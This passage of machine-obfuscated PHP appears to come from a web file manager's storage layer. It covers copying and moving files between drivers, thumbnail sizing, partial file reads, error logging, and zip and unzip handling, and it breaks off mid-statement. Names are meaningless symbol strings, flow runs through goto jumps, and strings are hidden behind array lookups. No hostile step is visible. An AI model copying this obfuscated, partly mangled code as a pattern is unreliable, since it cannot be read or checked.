Hook::trigger($E™©–«áëÕ[1062], $dóóì◊‡Ìñ, $Fá⁄âê¬ﬂê, $cçÛπä∆ﬁ–, $DÚÁ§ùßË¿, $cÂ˘Ç™ªêˆ, $aäüËö’ºÚ); self::copyMoveKeepInfo($dóóì◊‡Ìñ, $Fá⁄âê¬ﬂê, $aäüËö’ºÚ); goto E‡ù∆ÿ¬åΩ; Eç∏Êø¥π≠: Hook::trigger($E™©–«áëÕ[1061], $dóóì◊‡Ìñ, $Fá⁄âê¬ﬂê, $cçÛπä∆ﬁ–, $DÚÁ§ùßË¿, $cÂ˘Ç™ªêˆ, $A€ƒô≥’Íñ); if (self::driverIsSame($dóóì◊‡Ìñ, $cçÛπä∆ﬁ–)) { if ($D–¯…•¯ÃÙ) { $aäüËö’ºÚ = $cçÛπä∆ﬁ–->moveFile($Fá⁄âê¬ﬂê, $DÚÁ§ùßË¿); } else { $aäüËö’ºÚ = $cçÛπä∆ﬁ–->copyFile($Fá⁄âê¬ﬂê, $DÚÁ§ùßË¿); } Hook::trigger($E™©–«áëÕ[1062], $dóóì◊‡Ìñ, $Fá⁄âê¬ﬂê, $cçÛπä∆ﬁ–, $DÚÁ§ùßË¿, $cÂ˘Ç™ªêˆ, $aäüËö’ºÚ); self::copyMoveKeepInfo($dóóì◊‡Ìñ, $Fá⁄âê¬ﬂê, $aäüËö’ºÚ); return $aäüËö’ºÚ; } $aÖäóáËä = TEMP_FILES; goto d¥ïÍπå˘Ô; f≠ŒÀãÍö®: $c«Ô≥˘≥úä = $dóóì◊‡Ìñ->download($Fá⁄âê¬ﬂê, $c«Ô≥˘≥úä); $c«Ô≥˘≥úä = $dóóì◊‡Ìñ->iconvApp($c«Ô≥˘≥úä); $aäüËö’ºÚ = $cçÛπä∆ﬁ–->upload($DÚÁ§ùßË¿, $c«Ô≥˘≥úä, $D–¯…•¯ÃÙ); goto c„•ûçÉ’; E‡ù∆ÿ¬åΩ: return $aäüËö’ºÚ; goto BßÖº¡·Ï; D’Ëπùπ∫Ì: mk_dir($Eµ—·≈ﬂø¢); $c«Ô≥˘≥úä = $Eµ—·≈ﬂø¢ . $A€ƒô≥’Íñ; $d÷∫¯∏Ô‡∂ = $c«Ô≥˘≥úä; goto f≠ŒÀãÍö®; d¥ïÍπå˘Ô: if ($GLOBALS[$E™©–«áëÕ[6]][$E™©–«áëÕ[88]][$E™©–«áëÕ[779]]) { $aÖäóáËä = $GLOBALS[$E™©–«áëÕ[6]][$E™©–«áëÕ[88]][$E™©–«áëÕ[779]]; } $D–¯…•¯ÃÙ = !0; $Eµ—·≈ﬂø¢ = $aÖäóáËä; goto D’Ëπùπ∫Ì; BßÖº¡·Ï: } private static function copyMoveKeepInfo($FÙÂΩ≥√û∫, $C“·ß‚∂Çñ, $b›ÆºØ‰‰Ã) { if (!$b›ÆºØ‰‰Ã) { return; } $d™ﬁ¢√öÈÀ = $FÙÂΩ≥√û∫->info($C“·ß‚∂Çñ); if (!is_array($d™ﬁ¢√öÈÀ)) { return; } IO::setModifyTime($b›ÆºØ‰‰Ã, $d™ﬁ¢√öÈÀ[$_SERVER[™⁄»üÆ][84]]); } public static function pathFather($BëøπãúÌÉ) { $fíåµŒÓüâ = IO::init($BëøπãúÌÉ); $b≈á∆∂ÕÚÆ = $fíåµŒÓüâ->pathFather($fíåµŒÓüâ->path); return $fíåµŒÓüâ->getPathOuter($b≈á∆∂ÕÚÆ); } public static function fileOut($BΩˆ«Ü’áÙ, $C•ıê¿Î¿â = false, $B˘Œ‡’«î = false, $b£ººé¡†ñ = '') { $A¿ü®¢ÙõÎ = self::driverMake($BΩˆ«Ü’áÙ); if ($A¿ü®¢ÙõÎ->isFileOutServer()) { return $A¿ü®¢ÙõÎ->fileOutServer($BΩˆ«Ü’áÙ, $C•ıê¿Î¿â, $B˘Œ‡’«î, $b£ººé¡†ñ); } return $A¿ü®¢ÙõÎ->fileOut($BΩˆ«Ü’áÙ, $C•ıê¿Î¿â, $B˘Œ‡’«î, $b£ººé¡†ñ); } public static function fileOutImage($Dì¶•Ò·÷∆, $F±ª‘¡‡À‚ = 250) { $C‰≤ÑëÉ∫Ω = array(250, 600, 1200, 3000, 5000); for ($b©Î≤–”Ïè = 0; $b©Î≤–”Ïè < count($C‰≤ÑëÉ∫Ω); $b©Î≤–”Ïè++) { if ($b©Î≤–”Ïè == 0 && $F±ª‘¡‡À‚ <= $C‰≤ÑëÉ∫Ω[$b©Î≤–”Ïè]) { $F±ª‘¡‡À‚ = $C‰≤ÑëÉ∫Ω[$b©Î≤–”Ïè]; break; } else { if ($F±ª‘¡‡À‚ > $C‰≤ÑëÉ∫Ω[$b©Î≤–”Ïè - 1] && $F±ª‘¡‡À‚ <= $C‰≤ÑëÉ∫Ω[$b©Î≤–”Ïè]) { $F±ª‘¡‡À‚ = $C‰≤ÑëÉ∫Ω[$b©Î≤–”Ïè]; break; } else { if ($b©Î≤–”Ïè == count($C‰≤ÑëÉ∫Ω) - 1 && $F±ª‘¡‡À‚ > $C‰≤ÑëÉ∫Ω[$b©Î≤–”Ïè]) { $F±ª‘¡‡À‚ = $C‰≤ÑëÉ∫Ω[$b©Î≤–”Ïè]; break; } } } } $cŸ¢Üìíö⁄ = self::driverMake($Dì¶•Ò·÷∆); if ($cŸ¢Üìíö⁄->isFileOutServer()) { return $cŸ¢Üìíö⁄->fileOutImageServer($Dì¶•Ò·÷∆, $F±ª‘¡‡À‚); } return $cŸ¢Üìíö⁄->fileOutImage($Dì¶•Ò·÷∆, $F±ª‘¡‡À‚); } private static function driverIsSame($a√±ı◊åˆò, $C¬ÿ“çêãÍ) { goto eà‘ÙèÆÚä; cΩí”É‚Éó: if ($a√±ı◊åˆò->pathDriver == $C¬ÿ“çêãÍ->pathDriver) { return !0; } return !1; goto a†¢ßèß¥õ; aû¬áÿ«ö±: if ($F¢ï•áÆ¶ != $BâÍüÃ¶–—) { return !1; } if ($F¢ï•áÆ¶ == $D›ùËªÛ‰¡[737]) { return !0; } if ($F¢ï•áÆ¶ == $D›ùËªÛ‰¡[106]) { return !0; } goto cΩí”É‚Éó; eà‘ÙèÆÚä: $D›ùËªÛ‰¡ =& $_SERVER[™⁄»üÆ]; $F¢ï•áÆ¶ = $a√±ı◊åˆò->getType(); $BâÍüÃ¶–— = $C¬ÿ“çêãÍ->getType(); goto aû¬áÿ«ö±; a†¢ßèß¥õ: } public static function copyUpdate($b™≈Òêó∆É, $E¡œÿ√Éï∑) { goto bìŒ£≤ˆ”é; bìŒ£≤ˆ”é: $d âñØ†îÖ =& $_SERVER[™⁄»üÆ]; if (!IO::exist($b™≈Òêó∆É)) { return !1; } if (!IO::exist($E¡œÿ√Éï∑)) { IO::mkdir($E¡œÿ√Éï∑); } goto a…ª©á¯¢’; DíìÇé‹åÓ: Hook::trigger($d âñØ†îÖ[1066], $b™≈Òêó∆É, $E¡œÿ√Éï∑, $Dëãı√àÓÁ); foreach ($fé”°û‹ñ˜ as $c¯ıóÕŒ Æ) { IO::mkdir($c¯ıóÕŒ Æ); } foreach ($Bπ®ãÜúçû as $c¯ıóÕŒ Æ) { IO::copy($c¯ıóÕŒ Æ[$d âñØ†îÖ[1063]], $c¯ıóÕŒ Æ[$d âñØ†îÖ[1064]], REPEAT_REPLACE); } goto E≥´∫ã»±„; a…ª©á¯¢’: $f∏Í°¡ÿ≈Ô = self::_listAll($b™≈Òêó∆É); $aÔˆ‰„“„◊ = self::_listAll($E¡œÿ√Éï∑); $Bπ®ãÜúçû = array(); goto f‡ëëíèﬂê; f‡ëëíèﬂê: $fé”°û‹ñ˜ = array(); foreach ($f∏Í°¡ÿ≈Ô as $d∞éöâ∏ÈÀ => $c¯ıóÕŒ Æ) { if (isset($aÔˆ‰„“„◊[$d∞éöâ∏ÈÀ])) { if ($c¯ıóÕŒ Æ[$d âñØ†îÖ[77]] == 1) { continue; } if ($aÔˆ‰„“„◊[$d∞éöâ∏ÈÀ][$d âñØ†îÖ[78]] == $c¯ıóÕŒ Æ[$d âñØ†îÖ[78]]) { continue; } } if ($c¯ıóÕŒ Æ[$d âñØ†îÖ[77]] == 1) { $fé”°û‹ñ˜[] = $E¡œÿ√Éï∑ . $d âñØ†îÖ[8] . $d∞éöâ∏ÈÀ; continue; } $e‚´°ÀÍÛá = strstr(trim($d∞éöâ∏ÈÀ, $d âñØ†îÖ[8]), $d âñØ†îÖ[8]) ? get_path_father($d∞éöâ∏ÈÀ) : $d âñØ†îÖ[33]; $Bπ®ãÜúçû[] = array($d âñØ†îÖ[1063] => $c¯ıóÕŒ Æ[$d âñØ†îÖ[76]], $d âñØ†îÖ[1064] => rtrim($E¡œÿ√Éï∑, $d âñØ†îÖ[8]) . $d âñØ†îÖ[8] . $e‚´°ÀÍÛá, $d âñØ†îÖ[1065] => $c¯ıóÕŒ Æ); } $Dëãı√àÓÁ = array($d âñØ†îÖ[193] => $Bπ®ãÜúçû, $d âñØ†îÖ[77] => $fé”°û‹ñ˜); goto DíìÇé‹åÓ; E≥´∫ã»±„: } private static function _listAll($A¯ı§Ø±ãü) { $BŸêÕÕ…Ï… =& $_SERVER[™⁄»üÆ]; $A¯ı§Ø±ãü = KodIO::clear($A¯ı§Ø±ãü); $d˘ååêë„… = IO::listAll($A¯ı§Ø±ãü); foreach ($d˘ååêë„… as &$FË™õÚå’Ö) { $f‚®©≥É—© = substr($FË™õÚå’Ö[$BŸêÕÕ…Ï…[76]], strlen($A¯ı§Ø±ãü)); $FË™õÚå’Ö[$BŸêÕÕ…Ï…[1067]] = trim($f‚®©≥É—©, $BŸêÕÕ…Ï…[8]); } unset($FË™õÚå’Ö); return array_to_keyvalue($d˘ååêë„…, $BŸêÕÕ…Ï…[1067]); } public static function fileSubstr($bÍ≥¿£ô∞∑, $Bƒë£ãÕöÜ, $Fà¿…Üá¿é = false) { goto e≈‡∫ó§‚Ω; E∆óÍ·áëÍ: $C©ï¯‹ÂÕø = $Bƒë£ãÕöÜ; $C¥¥âã¡æ´ = $Fà¿…Üá¿é; if ($Bƒë£ãÕöÜ < 0) { $Bƒë£ãÕöÜ = $AîÑ¨ÓÖ¡ü + $Bƒë£ãÕöÜ; } goto BäπÌ∞Ûâé; CÒÒ«Û°öÊ: if ($Fà¿…Üá¿é <= 0) { return $b∫ê¬÷ûßë[33]; } if ($Bƒë£ãÕöÜ < 0 || $Bƒë£ãÕöÜ >= $AîÑ¨ÓÖ¡ü || $Fà¿…Üá¿é > 1024 * 1024 * 10) { throw new Exception("\146\151\154\x65\122\145\x61\144\x20\145\x72\x72\157\x72\41\40\x73\164\x61\162\164\75{$Bƒë£ãÕöÜ}\x3b\154\145\156\147\164\150\75{$Fà¿…Üá¿é}\x3b\x20\x73\151\172\145\x3d{$AîÑ¨ÓÖ¡ü}\73"); } $EÓ¨⁄ò—¬◊ = $cîÏŒÕß˜ı->fileSubstr($bÍ≥¿£ô∞∑, $Bƒë£ãÕöÜ, $Fà¿…Üá¿é); goto f∑èÁÖÀ˜≥; f∑èÁÖÀ˜≥: if (!$EÓ¨⁄ò—¬◊ && $Fà¿…Üá¿é && isset($GLOBALS[$b∫ê¬÷ûßë[1070]])) { throw new Exception($GLOBALS[$b∫ê¬÷ûßë[1070]][$b∫ê¬÷ûßë[1071]]); } return $EÓ¨⁄ò—¬◊; goto Dü¥¿ú´¨ƒ; e≈‡∫ó§‚Ω: $b∫ê¬÷ûßë =& $_SERVER[™⁄»üÆ]; $cîÏŒÕß˜ı = self::driverMake($bÍ≥¿£ô∞∑); $AîÑ¨ÓÖ¡ü = $cîÏŒÕß˜ı->size($bÍ≥¿£ô∞∑); goto E∆óÍ·áëÍ; BäπÌ∞Ûâé: if ($Fà¿…Üá¿é === !1) { $Fà¿…Üá¿é = $AîÑ¨ÓÖ¡ü - $Bƒë£ãÕöÜ; } if ($Bƒë£ãÕöÜ + $Fà¿…Üá¿é > $AîÑ¨ÓÖ¡ü) { $Fà¿…Üá¿é = $AîÑ¨ÓÖ¡ü - $Bƒë£ãÕöÜ; } if (!$AîÑ¨ÓÖ¡ü && $cîÏŒÕß˜ı->getType() == $b∫ê¬÷ûßë[106] && !$cîÏŒÕß˜ı->exist($bÍ≥¿£ô∞∑)) { throw new Exception($b∫ê¬÷ûßë[1068] . LNG($b∫ê¬÷ûßë[1069]) . $b∫ê¬÷ûßë[934] . get_path_this($bÍ≥¿£ô∞∑) . $b∫ê¬÷ûßë[33]); } goto CÒÒ«Û°öÊ; Dü¥¿ú´¨ƒ: } private static function driverMake(&$EëÊãÉ©°ﬁ) { goto aº›À«©§–; CúŸéÍ÷ò‚: return $D›ù„É¶ˆ—; goto Bêâ‡πÊ≠É; aº›À«©§–: $DÏ ±äÂìÉ =& $_SERVER[™⁄»üÆ]; $bÿÕí‘‹¨◊ = KodIO::parse($EëÊãÉ©°ﬁ); if (!self::$driverListSystem) { $b…ÖÿΩê≤Ê = Model($DÏ ±äÂìÉ[746])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($b…ÖÿΩê≤Ê, $DÏ ±äÂìÉ[394]); } goto eËù˜ÃÎ¯; eËù˜ÃÎ¯: if ($bÿÕí‘‹¨◊[$DÏ ±äÂìÉ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$bÿÕí‘‹¨◊[$DÏ ±äÂìÉ[394]]]) { return !1; } $EëÊãÉ©°ﬁ = $bÿÕí‘‹¨◊[$DÏ ±äÂìÉ[1072]]; $D›ù„É¶ˆ— = self::driverGet($bÿÕí‘‹¨◊, $EëÊãÉ©°ﬁ); goto CúŸéÍ÷ò‚; Bêâ‡πÊ≠É: } private static function driverGet($DÏƒ±≠◊ˆÓ, &$A„∂Èöá¢•) { goto dëÕ∞áõ˜å; aÛâà¡ Á„: switch ($DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[29]]) { case KodIO::KOD_IO: $E√¡ª™∏ÕÜ = self::$driverListSystem[$F≤∏“«Â≈÷]; break; case KodIO::KOD_SOURCE: $A„∂Èöá¢• = $F≤∏“«Â≈÷ . $A„∂Èöá¢•; $E√¡ª™∏ÕÜ = array($F¬–úó¶£›[1074] => $F¬–úó¶£›[1075], $F¬–úó¶£›[6] => $DÏƒ±≠◊ˆÓ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $E≥ßΩ·∫—÷ = $GLOBALS[$F¬–úó¶£›[1076]]; self::$driverListUser = array_to_keyvalue($E≥ßΩ·∫—÷, $F¬–úó¶£›[394]); } $E√¡ª™∏ÕÜ = self::$driverListUser[$F≤∏“«Â≈÷]; break; case KodIO::KOD_SHARE_LINK: $E√¡ª™∏ÕÜ = array($F¬–úó¶£›[1074] => $F¬–úó¶£›[1077], $F¬–úó¶£›[6] => $DÏƒ±≠◊ˆÓ); $AíöûªΩ•È = Action($F¬–úó¶£›[1078])->sharePathInfo($DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[76]]); $A„∂Èöá¢• = $AíöûªΩ•È[$F¬–úó¶£›[396]]; if (!$AíöûªΩ•È[$F¬–úó¶£›[396]]) { $d∂ì®‰ñåî = Model($F¬–úó¶£›[577])->getInfo($AíöûªΩ•È[$F¬–úó¶£›[469]]); $A„∂Èöá¢• = KodIO::clear($d∂ì®‰ñåî[$F¬–úó¶£›[1079]] . $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[1072]]); $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[467]] = $d∂ì®‰ñåî; $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[1056]] = $A„∂Èöá¢•; $E√¡ª™∏ÕÜ = array($F¬–úó¶£›[1074] => $F¬–úó¶£›[1080], $F¬–úó¶£›[6] => $DÏƒ±≠◊ˆÓ); } break; case KodIO::KOD_SHARE_ITEM: $E√¡ª™∏ÕÜ = array($F¬–úó¶£›[1074] => $F¬–úó¶£›[1081], $F¬–úó¶£›[6] => $DÏƒ±≠◊ˆÓ); $d∂ì®‰ñåî = Model($F¬–úó¶£›[577])->getInfo($DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[394]]); if ($d∂ì®‰ñåî[$F¬–úó¶£›[396]] == $F¬–úó¶£›[191]) { $A„∂Èöá¢• = KodIO::clear($d∂ì®‰ñåî[$F¬–úó¶£›[1079]] . $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[1072]]); $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[467]] = $d∂ì®‰ñåî; $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[1056]] = $A„∂Èöá¢•; $E√¡ª™∏ÕÜ = array($F¬–úó¶£›[1074] => $F¬–úó¶£›[1082], $F¬–úó¶£›[6] => $DÏƒ±≠◊ˆÓ); } else { if (!$A„∂Èöá¢•) { $A„∂Èöá¢• = $d∂ì®‰ñåî[$F¬–úó¶£›[396]]; } } break; default: $A„∂Èöá¢• = $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[76]]; $E√¡ª™∏ÕÜ = array($F¬–úó¶£›[1074] => $F¬–úó¶£›[1083]); break; } $eú¯É»€áÃ = $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[76]]; if (!isset(self::$driverCache[$eú¯É»€áÃ])) { $eê∏◊ÿæôÿ = strtolower($E√¡ª™∏ÕÜ[$F¬–úó¶£›[94]]); $b·ÏÁÆöπ≤ = $GLOBALS[$F¬–úó¶£›[6]][$F¬–úó¶£›[88]][$F¬–úó¶£›[810]]; $aΩ†ÏáÍåã = $F¬–úó¶£›[72] . (isset($b·ÏÁÆöπ≤[$eê∏◊ÿæôÿ]) ? $b·ÏÁÆöπ≤[$eê∏◊ÿæôÿ] : ucfirst($eê∏◊ÿæôÿ)); if (!class_exists($aΩ†ÏáÍåã)) { show_json("{$aΩ†ÏáÍåã}\x20\x6e\157\x74\x20\145\x78\151\163\164\163\41", !1); } $c∑ö´îÁÑÇ = isset($E√¡ª™∏ÕÜ[$F¬–úó¶£›[6]]) ? $E√¡ª™∏ÕÜ[$F¬–úó¶£›[6]] : !1; self::$driverCache[$eú¯É»€áÃ] = new $aΩ†ÏáÍåã($c∑ö´îÁÑÇ); } goto F…“∞∞ç¶‡; F…“∞∞ç¶‡: $b´¬«‰´ø∆ = self::$driverCache[$eú¯É»€áÃ]; $b´¬«‰´ø∆->pathDriver = $d∑’Ø¿éŒì; $b´¬«‰´ø∆->pathBase = $F¬–úó¶£›[33]; goto c‰”ªä„àä; a•ÂÈ‚Á∂ô: $b´¬«‰´ø∆->path = $A„∂Èöá¢•; return $b´¬«‰´ø∆; goto AﬁÍﬁÉ‹øº; c‰”ªä„àä: if (isset($E√¡ª™∏ÕÜ[$F¬–úó¶£›[6]][$F¬–úó¶£›[1084]])) { $b´¬«‰´ø∆->pathBase = rtrim($E√¡ª™∏ÕÜ[$F¬–úó¶£›[6]][$F¬–úó¶£›[1084]], $F¬–úó¶£›[8]) . $F¬–úó¶£›[8]; $A„∂Èöá¢• = $b´¬«‰´ø∆->pathBase . ltrim($A„∂Èöá¢•, $F¬–úó¶£›[8]); } $A„∂Èöá¢• = $b´¬«‰´ø∆->getPath($A„∂Èöá¢•); if (isset($DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[1056]])) { $A„∂Èöá¢• = $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[1056]]; } goto a•ÂÈ‚Á∂ô; dëÕ∞áõ˜å: $F¬–úó¶£› =& $_SERVER[™⁄»üÆ]; $d∑’Ø¿éŒì = $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[1073]]; $F≤∏“«Â≈÷ = $DÏƒ±≠◊ˆÓ[$F¬–úó¶£›[394]]; goto aÛâà¡ Á„; AﬁÍﬁÉ‹øº: } public static function errorTips($dŸ∆â†—ç… = false) { goto Dôå ŒëÈ ; eÓêı¡’äÎ: if ($dŸ∆â†—ç… === -1) { return $D£°÷‡Ï¢ ? $D£°÷‡Ï¢[count($D£°÷‡Ï¢) - 1] : $B®‘ñÜ√°ó[33]; } if ($dŸ∆â†—ç… === !1) { return implode($B®‘ñÜ√°ó[229], $D£°÷‡Ï¢); } if (count($D£°÷‡Ï¢) >= $BÌ¿ÌÓè√À) { $D£°÷‡Ï¢ = array_slice($D£°÷‡Ï¢, $BÌ¿ÌÓè√À * 0.5, $BÌ¿ÌÓè√À); } goto EòÉ¡•Á€Ã; Dôå ŒëÈ : $B®‘ñÜ√°ó =& $_SERVER[™⁄»üÆ]; static $D£°÷‡Ï¢ = array(); $BÌ¿ÌÓè√À = 1000; goto eÓêı¡’äÎ; EòÉ¡•Á€Ã: $D£°÷‡Ï¢[] = $dŸ∆â†—ç…; write_log($B®‘ñÜ√°ó[160] . ACTION . $B®‘ñÜ√°ó[1085] . $dŸ∆â†—ç…, $B®‘ñÜ√°ó[1086]); goto dﬁıÃ√ÎÊô; dﬁıÃ√ÎÊô: } public static function getLastError($D∫å…Ø∑±Ñ = '') { $A´Àù·ˆäÉ = self::errorTips(-1); return $A´Àù·ˆäÉ ? $A´Àù·ˆäÉ : $D∫å…Ø∑±Ñ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $D—ø÷†¥Ëê; if (!$D—ø÷†¥Ëê) { $Eèø•’ß·à = IO::init($_SERVER[™⁄»üÆ][8]); } return $Eèø•’ß·à; } private static function iconvSystem($BüØß∫õüû) { return self::local()->iconvSystem($BüØß∫õüû); } private static function iconvApp($D⁄‡¯ŒòÑö) { return self::local()->iconvApp($D⁄‡¯ŒòÑö); } public static function zip($a∂–◊√á†æ, $b≠⁄èü°û“ = "\x7a\x69\160", $Dóëó •µÀ = '', $cÛü‰∂ŒÈñ = REPEAT_RENAME) { goto C‘´¢•ÉÕ£; AÀÉ™·ä·Â: if (!$Dﬁ∆·˘Ö˜¯) { del_dir($B›√çÕ±µ◊); show_json(LNG($fñâÀõ·ÛÇ[1089]), !1); } del_dir($B›√çÕ±µ◊); return $Dﬁ∆·˘Ö˜¯; goto fÿ”Á±Œõ˘; CÓﬁ‘”Ü‚æ: foreach ($b¨Ö‘€›€Ø as $c∆§Òı·≥µ => $eè⁄¡üÙø–) { $b¨Ö‘€›€Ø[$c∆§Òı·≥µ] = self::iconvSystem($eè⁄¡üÙø–); } KodArchive::create($Dß¥∂≤ëñ¿, $b¨Ö‘€›€Ø); if (!IO::exist($Fëºﬂåˆ∂í)) { if ($B›√çÕ±µ◊) { del_dir($B›√çÕ±µ◊); } show_json(LNG($fñâÀõ·ÛÇ[1089]), !1); } goto b®öæ´ﬁ¿Ÿ; b¡◊ÊﬁëÙ¥: $B›√çÕ±µ◊ = !1; if (!$Dóëó •µÀ && $DÏµ€Çóﬁˆ->getType() == $fñâÀõ·ÛÇ[106]) { $b¨Ö‘€›€Ø = self::zipFileList($a∂–◊√á†æ); } else { $B›√çÕ±µ◊ = $Dóëó •µÀ ? $Dóëó •µÀ : TEMP_FILES . $fñâÀõ·ÛÇ[1087] . time() . rand_string(8) . $fñâÀõ·ÛÇ[8]; mk_dir($B›√çÕ±µ◊); $b¨Ö‘€›€Ø = self::zipFileList($a∂–◊√á†æ, $B›√çÕ±µ◊); } $Aãë«Üê∞• = $Däµ∫¿‰âû[$fñâÀõ·ÛÇ[28]]; goto AÜÖºê°Û¡; AÜÖºê°Û¡: if (count($b¨Ö‘€›€Ø) > 1) { $B¥„ÃËÖÛâ = IO::info(IO::pathFather($Däµ∫¿‰âû[$fñâÀõ·ÛÇ[76]])); $Aãë«Üê∞• = $B¥„ÃËÖÛâ[$fñâÀõ·ÛÇ[28]]; } $F¬ÓÊÖﬂà≈ = $B›√çÕ±µ◊; if (!$F¬ÓÊÖﬂà≈) { $F¬ÓÊÖﬂà≈ = get_path_father($Däµ∫¿‰âû[$fñâÀõ·ÛÇ[76]]); if (!$Dóëó •µÀ && $DÏµ€Çóﬁˆ->getType() == $fñâÀõ·ÛÇ[106]) { $F¬ÓÊÖﬂà≈ = get_path_father($DÏµ€Çóﬁˆ->path); } $BÚµè∆≠Ìñ = IO::info($F¬ÓÊÖﬂà≈); if (!$BÚµè∆≠Ìñ[$fñâÀõ·ÛÇ[196]]) { show_json(LNG($fñâÀõ·ÛÇ[1088]), !1); } } goto b«ÑÃê±åé; C‘´¢•ÉÕ£: $fñâÀõ·ÛÇ =& $_SERVER[™⁄»üÆ]; $DÏµ€Çóﬁˆ = self::init($a∂–◊√á†æ[0][$fñâÀõ·ÛÇ[76]]); $Däµ∫¿‰âû = self::info($a∂–◊√á†æ[0][$fñâÀõ·ÛÇ[76]]); goto b¡◊ÊﬁëÙ¥; b«ÑÃê±åé: $Fëºﬂåˆ∂í = $F¬ÓÊÖﬂà≈ . $Aãë«Üê∞• . $fñâÀõ·ÛÇ[95] . $b≠⁄èü°û“; $Fëºﬂåˆ∂í = get_filename_auto($Fëºﬂåˆ∂í, $fñâÀõ·ÛÇ[33], $cÛü‰∂ŒÈñ); $Dß¥∂≤ëñ¿ = self::iconvSystem($Fëºﬂåˆ∂í); goto CÓﬁ‘”Ü‚æ; b®öæ´ﬁ¿Ÿ: if ($Dóëó •µÀ || !$B›√çÕ±µ◊) { if ($B›√çÕ±µ◊ && strstr($B›√çÕ±µ◊, TEMP_FILES)) { $bÃÙ‚éâÑ´ = $b¨Ö‘€›€Ø = array(); recursion_dir($F¬ÓÊÖﬂà≈, $bÃÙ‚éâÑ´, $b¨Ö‘€›€Ø, 0); foreach ($bÃÙ‚éâÑ´ as $Fûõ¶‚∫†Ñ) { del_dir($Fûõ¶‚∫†Ñ); } foreach ($b¨Ö‘€›€Ø as $Dô«ÚÛˆ¨º) { if ($Dô«ÚÛˆ¨º == $Dß¥∂≤ëñ¿) { continue; } del_file($Dô«ÚÛˆ¨º); } } return $Fëºﬂåˆ∂í; } $A‡áù•ı∏– = self::pathFather($Däµ∫¿‰âû[$fñâÀõ·ÛÇ[76]]); $Dﬁ∆·˘Ö˜¯ = self::move($Fëºﬂåˆ∂í, $A‡áù•ı∏–, $cÛü‰∂ŒÈñ); goto AÀÉ™·ä·Â; fÿ”Á±Œõ˘: } public static function unzip($fÓ÷É¶È¡ , $C∑¯Êø¶ÿﬁ = "\x72\x65\x70\154\x61\x63\x65") { goto FàÔâô·¬Ò; BØ≈ΩŒ‚ïÕ: Hook::trigger($E¢éú≤∑´ø[1097], $c‹Õ£ì∆ë÷); recursion_dir($c‹Õ£ì∆ë÷, $Fà≤¨≠ÖçÙ, $CËóﬂ≠Ê‘, 0); $c†©Ç⁄µç≤ = array_merge($Fà≤¨≠ÖçÙ, $CËóﬂ≠Ê‘); goto eÜ¡º¬ìµØ; DÔØ±◊ÌÖÑ: mk_dir($c‹Õ£ì∆ë÷); $Bâ≠—¬Û◊‘ = self::fileExt($C‹Ãò”ŸèÎ); $b§‡«Û¿ﬁ◊ = $c‹Õ£ì∆ë÷ . $E¢éú≤∑´ø[95] . $Bâ≠—¬Û◊‘; goto c‘≤∫‘¢¿®; c‘≤∫‘¢¿®: if (!@file_exists(self::iconvSystem($b§‡«Û¿ﬁ◊))) { $B≈Ùˆ∏ÿ±Ò = self::localFilePath($c’„Õ·È®¿, $Bâ≠—¬Û◊‘); $b§‡«Û¿ﬁ◊ = $B≈Ùˆ∏ÿ±Ò ? $B≈Ùˆ∏ÿ±Ò : parent::download($c’„Õ·È®¿, $b§‡«Û¿ﬁ◊); } $b§‡«Û¿ﬁ◊ = self::iconvSystem($b§‡«Û¿ﬁ◊); $Fàùß‘†ÀÎ = isset($fÓ÷É¶È¡ [$E¢éú≤∑´ø[1092]]) ? $fÓ÷É¶È¡ [$E¢éú≤∑´ø[1092]] : $E¢éú≤∑´ø[1093]; goto DØ⁄§æôœ’; cÑ°ââÜ¥µ: $aÓÉÒ—øõí = self::tmpFileName($C‹Ãò”ŸèÎ); $c‹Õ£ì∆ë÷ = TEMP_FILES . $aÓÉÒ—øõí; del_dir($c‹Õ£ì∆ë÷); goto DÔØ±◊ÌÖÑ; DØ⁄§æôœ’: $cÕ´›Â◊áÒ = KodArchive::extract($b§‡«Û¿ﬁ◊, $c‹Õ£ì∆ë÷ . $E¢éú≤∑´ø[8], $Fàùß‘†ÀÎ); self::archiveExt(); if (!$cÕ´›Â◊áÒ[$E¢éú≤∑´ø[1094]]) { show_json($E¢éú≤∑´ø[1095] . $cÕ´›Â◊áÒ[$E¢éú≤∑´ø[1096]], !1); } goto BØ≈ΩŒ‚ïÕ; eÜ¡º¬ìµØ: foreach ($c†©Ç⁄µç≤ as $Cà“÷£œ≠ˆ) { $Cà“÷£œ≠ˆ = self::iconvApp($Cà“÷£œ≠ˆ); self::move($Cà“÷£œ≠ˆ, $FáóçﬂÒÃò, $C∑¯Êø¶ÿﬁ); } del_dir($c‹Õ£ì∆ë÷); if (!$B≈Ùˆ∏ÿ±Ò) { del_file($b§‡«Û¿ﬁ◊); } goto cŸ—¯àÙÁ°; cŸ—¯àÙÁ°: return !0; goto dà¬ã¨–≤–; dË°∑ÓÕﬂó: if (!($C‹Ãò”ŸèÎ = parent::info($c’„Õ·È®¿))) { show_json(LNG($E¢éú≤∑´ø[1091]), !1); } if (!($Fã∏ì¿≈Õ• = parent::infoFull($FáóçﬂÒÃò))) { $FáóçﬂÒÃò = parent::mkdir($FáóçﬂÒÃò); $Fã∏ì¿≈Õ• = array($E¢éú≤∑´ø[76] => $FáóçﬂÒÃò); } else { if (isset($Fã∏ì¿≈Õ•[$E¢éú≤∑´ø[396]]) && trim($Fã∏ì¿≈Õ•[$E¢éú≤∑´ø[76]], $E¢éú≤∑´ø[8]) != trim($FáóçﬂÒÃò, $E¢éú≤∑´ø[8])) { $A›⁄¬ªûπà = KodIO::make($Fã∏ì¿≈Õ•[$E¢éú≤∑´ø[479]]); $EùÑÍêˆÆÔ = parent::fileNameAuto($A›⁄¬ªûπà, 